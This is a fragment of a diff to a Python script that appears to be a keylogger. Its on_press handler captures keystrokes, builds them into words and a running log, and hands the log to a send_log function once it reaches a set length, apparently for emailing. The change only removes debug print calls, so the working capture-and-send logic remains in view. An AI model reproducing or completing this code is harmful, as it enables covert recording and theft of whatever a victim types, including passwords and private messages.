@@ -20,21 +20,16 @@ def on_press(key):
     global full_log
     global email_log_length
     global email
-    print(key)
     if key==Key.space or key==Key.enter:
-        print("HERE at space", key)
         word += " "
         full_log += word
         word=''
         if len(full_log) >= email_log_length:
-            print(full_log, len(full_log))
             send_log(full_log)
             full_log = ''
     elif key == Key.shift_l or key == Key.shift_r:
-        print("SHIFT")
         return
     elif key == Key.backspace:
-        print("backSPace")
         word=word[:-1]
     else:
         char = f'{key}'
